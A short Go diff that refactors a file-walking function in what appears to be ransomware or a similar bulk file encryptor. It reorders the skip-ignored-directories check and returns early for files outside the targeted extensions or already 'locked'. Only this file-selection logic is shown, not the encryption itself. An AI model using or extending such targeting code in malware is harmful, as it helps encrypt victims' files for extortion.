@@ -18,12 +18,23 @@ func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
 		var proceed bool
 		isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)
 
+		// ignore check.
+		for _, dir := range config.IgnoreDirs {
+			if strings.Contains(filepath.Dir(filePath), dir) {
+				return
+			}
+		}
+
 		// Only work on config.Extensions or locked.
 		for _, ext := range config.Extensions {
 			if strings.HasSuffix(filePath, ext) || isEncrypted {
 				proceed = true
 				break
 			}
+		}
+		// not in ext , should not proceed.
+		if !proceed {
+			return
 		}
 
 		if !cfg.Decode && isEncrypted {
@@ -36,13 +47,7 @@ func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
 			return
 		}
 
-		for _, dir := range config.IgnoreDirs {
-			if strings.Contains(filepath.Dir(filePath), dir) {
-				return
-			}
-		}
-
-		if proceed && count < config.ProcessMax {
+		if count < config.ProcessMax {
 			atomic.AddInt32(&count, 1)
 			fn(filePath, isEncrypted)
 		}
